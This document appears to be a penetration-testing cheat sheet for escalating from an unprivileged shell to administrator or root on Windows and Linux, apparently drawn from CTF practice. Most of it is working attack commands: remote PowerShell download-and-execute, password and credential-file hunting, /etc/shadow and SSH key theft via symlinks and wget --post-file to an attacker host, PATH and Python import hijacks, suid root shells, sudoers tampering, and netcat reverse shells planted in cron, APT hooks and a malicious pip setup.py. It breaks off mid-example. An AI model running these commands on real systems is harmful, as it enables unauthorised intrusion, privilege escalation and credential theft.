# Unprivileged Shell to Privileged Shell

Probably, at this point of time, we would have unprivileged shell of user www-data. If you are on Windows, there are particular set of steps. If you are on linux, it would be a good idea to first check privilege escalation techniques from g0tm1lk blog such as if there are any binary executable with SUID bits, if there are any cron jobs running with root permissions.

[Linux] If you have become a normal user of which you have a password, it would be a good idea to check sudo -l (for every user! Yes, even for www-data) to check if there are any executables you have permission to run.

## Windows Privilege Escalation

If you have a shell/ meterpreter from a windows box, probably, the first thing would be to utilize

### SystemInfo

Run system info and findout

- Operating System Version
- Architecture : Whether x86 or x64.
- Hotfix installed

The below system is running x64, Windows Server 2008 R2 with no Hotfixes installed.

```none
systeminfo

Host Name:                 VICTIM-MACHINE
OS Name:                   Microsoft Windows Server 2008 R2 Datacenter
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                00496-001-0001283-84782
Original Install Date:     18/3/2017, 7:04:46 ��
System Boot Time:          7/11/2017, 3:13:00 ��
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                            [01]: Intel64 Family 6 Model 79 Stepping 1 GenuineIntel ~2100 Mhz
                            [02]: Intel64 Family 6 Model 79 Stepping 1 GenuineIntel ~2100 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 5/4/2016
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     2.048 MB
Available Physical Memory: 1.640 MB
Virtual Memory: Max Size:  4.095 MB
Virtual Memory: Available: 3.665 MB
Virtual Memory: In Use:    430 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                            [01]: Intel(R) PRO/1000 MT Network Connection
                                  Connection Name: Local Area Connection
                                  DHCP Enabled:    No
                                  IP address(es)
                                  [01]: 10.54.98.9
```

If there are no Hotfixes installed, we can visit

```none
C:\Windows\SoftwareDistribution\Download
```

This directory is the temporary location for WSUS. Updates were downloaded here, doesn't mean were installed. Otherwise, we may visit

```none
C:\Windows\WindowUpdate.log 
```

which will inform if any hotfixes are installed.

We can also run

```none
wmic qfe

Caption                                     CSName           Description     FixComments  HotFixID   InstallDate  InstalledBy          InstalledOn  Name ServicePackInEffect  Status
http://support.microsoft.com/?kbid=4100347  LAPTOP           Update                        KB4100347               NT AUTHORITY\SYSTEM  9/17/2018
http://support.microsoft.com/?kbid=4343669  LAPTOP           Update                        KB4343669               NT AUTHORITY\SYSTEM  7/27/2018
http://support.microsoft.com/?kbid=4343902  LAPTOP           Security Update               KB4343902               NT AUTHORITY\SYSTEM  8/16/2018
```

### Metasploit Local Exploit Suggestor

Metasploit local_exploit_suggester : The module suggests local meterpreter exploits that can be used. The exploits are suggested based on the architecture and platform that the user has a shell opened as well as the available exploits in meterpreter.

Note

It is utmost important that the meterpreter should be of the same architecture as your target machine, otherwise local exploits may fail. For example. if you have target as windows 64-bit machine, you should have 64-bit meterpreter.

### Sherlock and PowerUp Powershell Script

- [Sherlock](https://github.com/rasta-mouse/Sherlock) PowerShell script by [rastamouse](https://twitter.com/_RastaMouse) to quickly find missing software patches for local privilege escalation vulnerabilities. If the Metasploit local_exploit_suggester didn't resulted in any exploits. Probably, try Sherlock Powershell script to see if there any vuln which can be exploited.

- [PowerUp](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc) : PowerUp aims to be a clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations.

The above can be executed by

```none
view-source:10.54.98.X/shell.php?cmd=echo IEX (New-Object Net.WebClient).DownloadString("http://YourIP:8000/Sherlock.ps1"); | powershell -noprofile -
```

We execute powershell with noprofile and accept the input from stdin

### Windows Exploit Suggestor

[Windows Exploit Suggestor](https://github.com/GDSSecurity/Windows-Exploit-Suggester) : This tool compares a targets patch levels against the Microsoft vulnerability database in order to detect potential missing patches on the target. It also notifies the user if there are public exploits and Metasploit modules available for the missing bulletins. Just copy the systeminfo information from the windows OS and compare the database.

If we are getting the below error on running local exploits of getuid in meterpreter

```none
[-] Exploit failed: Rex::Post::Meterpreter::RequestError stdapi_sys_config_getuid: Operation failed: Access is denied.
```

Possibly, migrate into a new process using post/windows/manage/migrate

### Windows Kernel Exploits

[Windows Kernel Exploits](https://github.com/SecWiki/windows-kernel-exploits) contains most of the compiled windows exploits. One way of running these is either upload these on victim system and execute. Otherwise, create a smb-server using Impacket

```none
usage: smbserver.py [-h] [-comment COMMENT] [-debug] [-smb2support] shareName sharePath

This script will launch a SMB Server and add a share specified as an argument. You need to be root in order to bind to port 445. No authentication will be enforced. Example: smbserver.py -comment 'My share' TMP /tmp

positional arguments:
    shareName         name of the share to add
    sharePath         path of the share to add
```

Assuming, the current directory contains our compiled exploit, we can

```none
impacket-smbserver <sharename> `pwd`
Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Once, smbserver is up and running, we can execute code like

```none
view-source:VictimIP/shell.php?cmd=\\YourIP\ShareName\ms15-051x64.exe whoami

*Considering shell.php is our php oneliner to execute commands.
```

### Abusing Token Privileges

If we have the windows shell or meterpreter, we can type "whoami /priv" or if we have meterpreter, we can type "getprivs"

If we have any of the below privileges, we can possibly utilize [Rotten Potato](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)

```none
SeImpersonatePrivilege
SeAssignPrimaryPrivilege
SeTcbPrivilege
SeBackupPrivilege
SeRestorePrivilege
SeCreateTokenPrivilege
SeLoadDriverPrivilege
SeTakeOwnershipPrivilege
SeDebugPrivilege
```

The above was for the Windows OS and the below is for Linux OS.

### Credential Manager

Sometimes, the user might have save his credentials in the memory while using "runas /savecred" option. We could check this by

```none
cmdkey /list
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

Note

Sometimes, while using Metasploit web delivery method, if the reverse_https payload doesn't work try reverse tcp maybe?

### Other Enumeration

Mostly taken from [Windows Privilege Escalation Guide](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)

**Environment Variables** : A domain controller in LOGONSERVER?

```none
set
Get-ChildItem Env: | ft Key,Value
```

**Connected Drives**

```none
net use
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

**Users**

Who are you?

```none
whoami
echo %USERNAME%
$env:UserName
```

What users are on the system? Any old user profiles that weren’t cleaned up?

```none
net users
dir /b /ad "C:\Users\"
dir /b /ad "C:\Documents and Settings\" # Windows XP and below
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
```

Is anyone else logged in?

```none
qwinsta
```

What groups are on the system?

```none
net localgroup
Get-LocalGroup | ft Name
```

Are any of the users in the Administrators group?

```none
net localgroup Administrators
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

Anything in the Registry for User Autologon?

```none
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul |findstr "DefaultUserName DefaultDomainName DefaultPassword"
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon' | select "Default*"
```

**Programs**

What software is installed?

```none
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE
Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

**Processes/ Services**

```none
tasklist /svc
tasklist /v
net start
sc query
```

Get-Process has a -IncludeUserName option to see the process owner, however you have to have administrative rights to use it.

```none
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
Get-Service
```

This one liner returns the process owner without admin rights, if something is blank under owner it’s probably running as SYSTEM, NETWORK SERVICE, or LOCAL SERVICE.

```none
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize
```

**Scheduled Tasks**

```none
schtasks /query /fo LIST 2>nul | findstr TaskName
dir C:\windows\tasks
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
```

**Startup?**

```none
wmic startup get caption,command
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
dir "C:\Documents and Settings\All Users\Start Menu\Programs\Startup"
dir "C:\Documents and Settings\%username%\Start Menu\Programs\Startup"
```

Powershell

```none
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
```

**Networking**

Firewall turned on? If so what’s configured?

```none
netsh firewall show state
netsh firewall show config
netsh advfirewall firewall show rule name=all
netsh advfirewall export "firewall.txt"
```

Interesting interface configurations?

```none
netsh dump
```

SNMP configurations

```none
reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s
Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse
```

**Sensitive Files**

passwords in the registry?

```none
reg query HKCU /f password /t REG_SZ /s
reg query HKLM /f password /t REG_SZ /s
```

Interesting files to look at? Possibly inside User directories (Desktop, Documents, etc)?

```none
dir /s *pass* == *vnc* == *.config* 2>nul
Get-Childitem –Path C:\Users\ -Include *password*,*vnc*,*.config -File -Recurse -ErrorAction SilentlyContinue
```

Files containing password inside them?

```none
findstr /si password *.xml *.ini *.txt *.config 2>nul
Get-ChildItem C:\* -include *.xml,*.ini,*.txt,*.config -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password"
```

## Linux Privilege Escalation

Techniques for Linux privilege escalation:

## Privilege escalation from g0tm1lk blog

Once, we have got the unprivileged shell, it is very important to check the below things

- Did you tried "sudo -l" and check if we have any binaries which can be executed as root?
- Are there any binaries with Sticky, suid, guid.
- Are there any world-writable folders, files.
- Are there any world-execuable files.
- Which are the files owned by nobody (No user)
- Which are the files which are owned by a particular user but are not present in their home directory. (Mostly, the users have files and folders in /home directory. However, that's not always the case.)
- What are the processes running on the machines? (ps aux). Remember, If something like knockd is running, we would come to know that Port Knocking is required.
- What are the packages installed? (dpkg -l for debian) (pip list for python packages). Maybe some vulnerable application is installed ready to be exploited (For example: chkroot version 0.49 or couchdb 1.7).
- What are the services running? (netstat -ln)
- Check the entries in the crontab!
- What are the files present in the /home/user folder? Are there any hidden files and folders? like .thunderbird/ .bash_history etc.
- What groups does the user belong to (adm, audio, video, disk)?
- What other users are logged on the linux box (command w)?

### What "Advanced Linux File Permissions" are used?

Sticky bits, SUID & GUID

```none
find / -perm -1000 -type d 2>/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.
find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.

find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID
for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done    # Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)

# find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null
```

### Where can written to and executed from?

A few 'common' places: /tmp, /var/tmp, /dev/shm

```none
find / -writable -type d 2>/dev/null      # world-writeable folders
find / -perm -222 -type d 2>/dev/null     # world-writeable folders
find / -perm -o+w -type d 2>/dev/null     # world-writeable folders
find / -perm -o+w -type f 2>/dev/null     # world-writeable files
find / -type f -perm -o+w -not -type l -not -path "/proc/*" -not -path "/sys/*" 2>/dev/null # world-writeable files

find / -perm -o+x -type d 2>/dev/null     # world-executable folders
find / -perm -o+x -type f 2>/dev/null     # world-executable files

find / \( -perm -o+w -perm -o+x \) -type d 2>/dev/null   # world-writeable & executable folders
```

### Any "problem" files?

Word-writeable, "nobody" files

```none
find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print   # world-writeable files
find /dir -xdev \( -nouser -o -nogroup \) -print   # Noowner files
```

### Find files/ folder owned by the user

After compromising the machine with an unprivileged shell, /home would contains the users present on the system. Also, viewable by checking /etc/passwd. Many times, we do want to see if there are any files owned by those users outside their home directory.

```none
find / -user username 2> /dev/null
find / -group groupname 2> /dev/null
```

Tip

Find files by wheel/ adm users or the users in the home directory. If the user is member of other groups (such as audio, video, disk), it might be a good idea to check for files owned by particular groups.

## Other Linux Privilege Escalation

### Execution of binary from Relative location than Absolute

If we figure out that a suid binary is running with relative locations (for example let's say backjob is running "id" and "scp /tmp/special ron@ton.home")(figured out by running strings on the binary). The problem with this is, that it’s trying to execute a file/ script/ program on a RELATIVE location (opposed to an ABSOLUTE location like /sbin would be). And we will now exploit this to become root.

Something like this:

```none
system("/usr/bin/env echo and now what?");
```

so we can create a file in temp:

```none
echo "/bin/sh" >> /tmp/id
chmod +x /tmp/id
```

```none
www-data@yummy:/tmp$ echo "/bin/sh" >> /tmp/id
www-data@yummy:/tmp$ export PATH=/tmp:$PATH
www-data@yummy:/tmp$ which id
/tmp/id
www-data@yummy:/tmp$ /opt/backjob
whoami
root
# /usr/bin/id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
```

By changing the PATH prior executing the vulnerable suid binary (i.e. the location, where Linux is searching for the relative located file), we force the system to look first into /tmp when searching for “scp” or "id" . So the chain of commands is:

- /opt/backjob switches user context to root (as it is suid) and tries to run “scp or id”
- Linux searches the filesystem according to its path (here: in /tmp first)
- Our malicious /tmp/scp or /tmp/id gets found and executed as root
- A new bash opens with root privileges.

If we execute a binary without specifying an absolute paths, it goes in order of your $PATH variable. By default, it's something like:

```none
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

It is important to see .bash_profile file which contains the $PATH

### Environment Variable Abuse

If the suid binary contains a code like

```none
asprintf(&buffer, "/bin/echo %s is cool", getenv("USER"));
printf("about to call system(\"%s\")\n", buffer);
system(buffer);
```

We can see that it is accepting environment variable USER which can be user-controlled. In that case just define USER variable to

```none
USER=";/bin/sh;"
```

When the program is executed, USER variable will contain /bin/sh and will be executed on system call.

```none
echo $USER
;/bin/sh;

levelXX@:/home/flagXX$ ./flagXX
about to call system("/bin/echo ;/bin/sh; is cool")

sh-4.2$ id
uid=997(flagXX) gid=1003(levelXX) groups=997(flagXX),1003(levelXX)
```

### World-Writable Folder with a Script executing any file in that folder using crontab

If there exists any world-writeable folder plus if there exists a cronjob which executes any script in that world-writeable folder such as

```none
#!/bin/sh

for i in /home/flagXX/writable.d/* ; do
    (ulimit -t 5; bash -x "$i")
    rm -f "$i"
done
```

then either we can create a script in that folder /home/flagXX/writeable.d which gives us a reverse shell like

```none
echo "/bin/nc.traditional -e /bin/sh 192.168.56.1 22" > hello.sh
```

or

we can create a suid file to give us the privileged user permission

```none
#!/bin/sh
gcc /var/tmp/shell.c -o /var/tmp/flagXX
chmod 4777 /var/tmp/flagXX
```

Considering shell.c contains

```none
int main(void) {
setgid(0); setuid(0);
execl("/bin/sh","sh",0); }
```

### Symlink Creation

Multiple time, we would find that a suid binary belonging to another user is authorized to read a particular file. For example Let's say there's a suid binary called readExampleConf which can read a file named example.conf as a suid user. This binary can be tricked into reading any other file by creating a Symlink or a softlink. For example if we want to read /etc/shadow file which can be read by suid user. we can do

```none
ln -s /etc/shadow /home/xxxxxx/example.conf
ln -s /home/xxx2/.ssh/id_rsa /home/xxxxxxx/example.conf
```

Now, when we try to read example.conf file, we would be able to read the file for which we created the symlink

```none
readExampleConf /home/xxxxxxx/example.conf
<Contents of shadow or id_rsa>
```

### Directory Symlink

Let's see what happens when we create a symlink of a directory

```none
ln -s /etc/ sym_file
ln -s /etc/ sym_fold/
```

Here the first one create a direct symlink to the /etc folder and will be shown as

```none
sym_file -> /etc/
```

where as in the second one ( ln -s /etc/ sym_fold/ ), we first create a folder sym_fold and then create a symlink

```none
sym_fold:
total 0
lrwxrwxrwx 1 bitvijays bitvijays 5 Dec  2 19:31 etc -> /etc/
```

This might be useful to bypass some filtering, when let's say a cronjob is running but refuses to take backup of anything named /etc . In that case, we can create a symlink inside a folder and take the backup.

### Time of check to time of use

In Unix, if a binary program such as below following C code (uses access to check the access of the specific file and to open a specific file), when used in a setuid program, has a TOCTTOU bug:

```none
if (access("file", W_OK) != 0) {
 exit(1);
}

fd = open("file", O_WRONLY);
//read over /etc/shadow
read(fd, buffer, sizeof(buffer));
```

Here, access is intended to check whether the real user who executed the setuid program would normally be allowed to write the file (i.e., access checks the real userid rather than effective userid). This race condition is vulnerable to an attack:

Attacker

```none
//
//
// After the access check
symlink("/etc/shadow", "file");
// Before the open, "file" points to the password database
//
//
```

In this example, an attacker can exploit the race condition between the access and open to trick the setuid victim into overwriting an entry in the system password database. TOCTTOU races can be used for privilege escalation, to get administrative access to a machine.

Let's see how we can exploit this?

In the below code, we are linking the file which we have access (/tmp/hello.txt) and the file which we want to read (and currently don't have access) (/home/flagXX/token). The f switch on ln makes sure we overwrite the existing symbolic link. We run it in the while true loop to create the race condition.

```none
while true; do ln -sf /tmp/hello.txt /tmp/token; ln -sf /home/flagXX/token /tmp/token ; done
```

We would also run the program in a while loop

```none
while true; do ./flagXX /tmp/token 192.168.56.1 ; done
```

Learning:

Using access() to check if a user is authorized to, for example, open a file before actually doing so using open(2) creates a security hole, because the user might exploit the short time interval between checking and opening the file to manipulate it. For this reason, the use of this system call should be avoided.

### Writable /etc/passwd or account credentials came from a legacy unix system

- Passwords are normally stored in /etc/shadow, which is not readable by users. However, historically, they were stored in the world-readable file /etc/passwd along with all account information.
- For backward compatibility, if a password hash is present in the second column in /etc/passwd, it takes precedence over the one in /etc/shadow.
- Also, an empty second field in /etc/passwd means that the account has no password, i.e. anybody can log in without a password (used for guest accounts). This is sometimes disabled.
- If passwordless accounts are disabled, you can put the hash of a password of your choice. we can use the mkpasswd to generate password hashes, for example

  ```none
  Usage: mkpasswd [OPTIONS]... [PASSWORD [SALT]]
  Crypts the PASSWORD using crypt(3).

      -m, --method=TYPE     select method TYPE
      -5                    like --method=md5
      -S, --salt=SALT       use the specified SALT
      -R, --rounds=NUMBER   use the specified NUMBER of rounds
      -P, --password-fd=NUM read the password from file descriptor NUM
                              instead of /dev/tty
      -s, --stdin           like --password-fd=0
      -h, --help            display this help and exit
      -V, --version         output version information and exit
    
  mkpasswd can generate DES, MD5, SHA-256, SHA-512
  ```

- It's possible to gain root access even if you can only append to /etc/passwd and not overwrite the contents. That's because it's possible to have multiple entries for the same user, as long as they have different names — users are identified by their ID, not by their name, and the defining feature of the root account is not its name but the fact that it has user ID 0. So you can create an alternate root account by appending a line that declares an account with another name, a password of your choice and user ID 0

### Elevating privilege from a suid binary

If we have ability to create a suid binary, we can use either

Suid.c

```none
int main(void) {
setgid(0); setuid(0);
execl(“/bin/sh”,”sh”,0); }
```

or

```none
int main(void) {
setgid(0); setuid(0);
system("/bin/bash -p"); }
```

However, if we have a unprivileged user, it is always better to check whether /bin/sh is the original binary or a symlink to /bin/bash or /bin/dash. If it's a symlink to bash, it won't provide us suid privileges, bash automatically drops its privileges when it's being run as suid (another security mechanism to prevent executing scripts as suid). So, it might be good idea to copy dash or sh to the remote system, suid it and use it.

More details can be found at [Common Pitfalls When Writing Exploits](http://www.mathyvanhoef.com/2012/11/common-pitfalls-when-writing-exploits.html)

### Executing Python script with sudo

If there exists a python script which has a import statement and a user has a permission to execute it using sudo.

```none
<display_script.py>

#!/usr/bin/python3
import ftplib or import example
<Python code utilizing ftplib or example calling some function>
print (example.display())
```

and is executed using

```none
sudo python display_script.py
```

We can use this to privilege escalate to the higher privileges. As python would imports modules in the current directory first, then from the modules dir (PYTHONPATH), we could make a malicious python script (of the same name of import module such as ftplib or example)
and have it imported by the program. The malicious script may have a function similar to used in example.py executing our command. e.g.

```none
<example.py>
#!/usr/bin/python3
import os

def display():
    os.system("whoami")
    exit()
```

The result would be "root". This is mainly because [sys.path](https://docs.python.org/2/library/sys.html#sys.path) is populated using the current working directory, followed by directories listed in your PYTHONPATH environment variable, followed by installation-dependent default paths, which are controlled by the site module.

**Example**

If we run our script with sudo (sudo myscript.py) then the environment variable $USER will be root and the environment variable $SUDO_USER will be the name of the user who executed the command sudo myscript.py. Consider the following scenario:

A linux user bob is logged into the system and possesses sudo privileges. He writes the following python script named myscript.py:

```none
#!/usr/bin/python
import os
print os.getenv("USER")
print os.getenv("SUDO_USER")
```

He then makes the script executable with chmod +x myscript.py and then executes his script with sudo privileges with the command:

```none
sudo ./myscript.py
```

The output of that program will be (using python 2.x.x):

```none
root
bob
```

If bob runs the program without sudo privileges with

```none
./myscript.py
```

he will get the following output:

```none
bob
None
```

## MySQL Privileged Escalation

If mysql (version 4.x, 5.x) process is running as root and we do have the mysql root password and we are an unprivileged user, we can utilize [User-Defined Function (UDF) Dynamic Library Exploit](http://www.0xdeadbeef.info/exploits/raptor_udf.c) . Refer [Gaining a root shell using mysql user defined functions and setuid binaries](https://infamoussyn.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/)

### More Information

- The MySQL service should really not run as root. The service and all mysql directories should be run and accessible from another account - mysql as an example.

- When MySQL is initialized, it creates a master account (root by default) that has all privileges to all databases on MySQL. This root account differs from the system root account, although it might still have the same password due to default install steps offered by MySQL.

- Commands can be executed inside MySQL, however, commands are executed as the current logged in user.

```none
mysql> \! sh
```

## Cron.d

Check cron.d and see if any script is executed as root at any time and is world writeable. If so, you can use to setuid a binary with /bin/bash and use it to get root.

### pspy

[pspy - unprivileged linux process snooping](https://github.com/DominicBreuker/pspy)  is a command line tool designed to snoop on processes without need for root permissions. It allows you to see commands run by other users, cron jobs, etc. as they execute.
Great for enumeration of Linux systems in CTFs. Also great to demonstrate your colleagues why passing secrets as arguments on the command line is a bad idea.

The tool gathers it's info from procfs scans. Inotify watchers placed on selected parts of the file system trigger these scans to catch short-lived processes. It is a great tool to search for cron jobs running.

## Unattended APT - Upgrade

If we have a ability to upload files to the host at any location (For. example misconfigured TFTP server) and APT-Update/ Upgrade is running at a set interval (Basically unattended-upgrade or via-a-cronjob), then we can use APT-Conf to run commands

### DPKG

Debconf configuration is initiated with following line. The command in brackets could be any arbitrary command to be executed in shell.

```none
Dpkg::Pre-Install-Pkgs {"/usr/sbin/dpkg-preconfigure --apt || true";};
```

There are also options

```none
Dpkg::Pre-Invoke {"command";};
Dpkg::Post-Invoke {"command";};
```

They execute commands before/ after apt calls dpkg. Post-Invoke which is invoked after every execution of dpkg (by an apt tool, not manually);

### APT

- APT::Update::Pre-Invoke {"your-command-here"};

- APT::Update::Post-Invoke-Success, which is invoked after successful updates (i.e. package information updates, not upgrades);

- APT::Update::Post-Invoke, which is invoked after updates, successful or otherwise (after the previous hook in the former case).

To invoke the above, create a file in  /etc/apt/apt.conf.d/ folder specifying the NN <Name> and keep the code in that

For example:

```none
APT::Update::Post-Invoke{"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f";};
```

When the apt-update would be executed, it would be executed as root and we would get a shell as a root.

## SUDO -l Permissions

Let's see which executables have permission to run as sudo, We have collated the different methods to get a shell if the below applications are suid: nmap, tee, tcpdump, find,  zip and package installers (pip, npm).

### nmap suid

```none
nmap --script <(echo 'require "os".execute "/bin/sh"')
```

or

```none
nmap --interactive
```

### tee suid

If tee is suid: tee is used to read input and then write it to output and files. That means we can use tee to read our own commands and add them to any_script.sh, which can then be run as root by a user. If some script is run as root, you may also run. For example, let's say tidy.sh is executed as root on the server, we can write the below code in temp.sh

```none
temp.sh
echo "example_user ALL=(ALL) ALL" > /etc/sudoers 
```

or

```none
chmod +w /etc/sudoers to add write properties to sudoers file to do the above
```

and then

```none
cat temp.sh | sudo /usr/bin/tee /usr/share/cleanup/tidyup.sh
```

which will add contents of temp.sh to tidyup.sh. (Assuming tidyup.sh is running as root by crontab)

### tcpdump

The “-z postrotate-command” option (introduced in tcpdump version 4.0.0).

Create a temp.sh ( which contains the commands to executed as root )

```none
id
/bin/nc 192.168.110.1 4444 -e /bin/bash
```

Execute the command

```none
sudo tcpdump -i eth0 -w /dev/null -W 1 -G 1 -z ./temp.sh -Z root
```

where

```none
-C file_size : Before  writing a raw packet to a savefile, check whether the file is currently larger than file_size and, if so, close the current savefile and open a new one.  Savefiles after the first savefile will have the name specified with the -w flag, with a number after it, starting at 1 and continuing upward.  The units of file_size are millions of bytes (1,000,000 bytes, not 1,048,576 bytes).

-W Used  in conjunction with the -C option, this will limit the number of files created to the specified number, and begin overwriting files from the beginning, thus creating a 'rotating' buffer.  In addition, it will name the files with enough leading 0s to support the maximum number of files, allowing them to sort correctly. Used in conjunction with the -G option, this will limit the number of rotated dump files that get created, exiting with status 0 when reaching the limit. If used with -C as well, the behavior will result in cyclical files per timeslice.

-z postrotate-command Used in conjunction with the -C or -G options, this will make tcpdump run " postrotate-command file " where file is the savefile being closed after each rotation. For example, specifying -z gzip or -z bzip will compress each savefile using gzip or bzip2.

Note that tcpdump will run the command in parallel to the capture, using the lowest priority so that this doesn't disturb the capture process.

And in case you would like to use a command that itself takes flags or different arguments, you can always write a shell script that will take the savefile name as the only argument, make the flags &  arguments arrangements and execute the command that you want.

    -Z user 
    --relinquish-privileges=user If tcpdump is running as root, after opening the capture device or input savefile, but before opening any savefiles for output, change the user ID to user and the group ID to the primary group of user.

    This behavior can also be enabled by default at compile time.
```

### zip

```none
touch /tmp/exploit
sudo -u root zip /tmp/exploit.zip /tmp/exploit -T --unzip-command="sh -c /bin/bash"
```

### find

If find is suid, we can use

```none
touch foo
find foo -exec whoami \;
```

Here, the foo file (a blank file) is created using the touch command as the -exec parameter of the find command will execute the given command for every file that it finds, so by using “find foo” it is ensured they only execute once. The above command will be executed as root.

HollyGrace has mentioned this in [Linux PrivEsc: Abusing SUID](https://www.gracefulsecurity.com/linux-privesc-abusing-suid/) More can be learn [How-I-got-root-with-sudo](https://www.securusglobal.com/community/2014/03/17/how-i-got-root-with-sudo/).

### wget

If the user has permission to run wget as sudo, we can read files (if the user whom we are sudo-ing have the permisson to read) by using --post-file parameter

```none
post_file = file   -- Use POST as the method for all HTTP requests and send the contents of file in the request body. The same as ‘--post-file=file’.
```

Example:

```none
sudo -u root wget --post-file=/etc/shadow http://AttackerIP:Port
```

On the attacker side, there can be a nc listener. The above would send the contents of /etc/shadow to the listener in the post request.

### Package Installation

**pip**

If the user have been provided permission to install packages as a sudo for example

```none
User username may run the following commands on hostname:
(root) /usr/bin/pip install *
```

We can exploit this by creating a custom pip package which would provide us a shell.

First, create a folder (Let's name it helloworld), and create two files setup.py and helloworld.py

```none
username@hostname:/tmp/helloworld$ ls
helloworld.py setup.py
```

Let's see, what setup.py contains

```none
cat setup.py

from setuptools import setup
import os
print os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|/bin/nc 10.10.14.26 4444 >/tmp/f")

setup(
    name='helloworld-script',    # This is the name of your PyPI-package.
    version='0.1',               # Update the version number for new releases
    scripts=['helloworld']       # The name of your scipt, and also the command you'll be using for calling it
)
```

and helloworld.py

```none
cat helloworld.py
#!/usr/bin/env python
print "Hello World"
```

The above can be a part of a sample package of python pip. For more details refer [A sample project that exists for PyPUG's "Tutorial on Packaging and Distributing Projects"](https://github.com/pypa/sampleproject) , [How To Package Your Python Code](http://python-packaging.readthedocs.io/en/latest/index.html) ,
[A simple Hello World setuptools package and installing it with pip <https://stackoverflow.com/questions/22051360/a-simple-hello-world-setuptools-package-and-installing-it-with-pip>`_
and [Packaging and distributing projects](https://packaging.python.org/tutorials/distributing-packages/)

The above package can be installed by using

```none
sudo -u root /usr/bin/pip install -e /tmp/helloworld

Obtaining file:///tmp/helloworld
```

The above would execute setup.py and provide us the shell.

Refer [Installing Packages](https://packaging.python.org/tutorials/installing-packages/) for different ways to install a pip package

Let's see the installed application

```none
pip list
